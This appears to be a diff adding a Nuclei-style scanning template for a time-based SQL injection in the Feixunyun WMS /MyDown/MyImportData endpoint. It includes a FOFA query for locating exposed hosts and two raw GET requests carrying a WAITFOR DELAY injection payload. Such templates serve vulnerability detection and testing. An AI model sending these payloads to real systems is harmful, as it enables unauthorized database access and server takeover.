@@ -1,0 +1,40 @@
+id: feixunyun-WMS-MyDown_MyImportData-sql
+
+info:
+  name: "飞讯云-WMS MyImportData 接口SQL延时注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="wx8ccb75857bd3e985"
+    飞讯云-WMS系统在/MyDown/MyImportData接口实现中存在可被利用的SQL延时注入缺陷。未经身份验证的远程攻击者可通过SQL注入漏洞提取数据库敏感数据（如管理员凭据、用户个人信息），并在具备高权限条件下实施服务器端恶意代码部署，进而控制目标系统。该漏洞允许攻击者通过构造特定时间延迟的SQL查询实现盲注攻击，最终可能导致完整数据库内容泄露及服务器权限接管。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/140764425
+  tags: 飞讯云-WMS
+
+
+
+http:
+- raw:
+  - |
+    GET /MyDown/MyImportData?opeid=1%27+WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
+    Host: {{Hostname}}
+
+
+  - |
+    GET /MyDown/MyImportData?opeid=1%27+WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
+    Host: {{Hostname}}
+
+
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
+
+
+
+
+
+
+
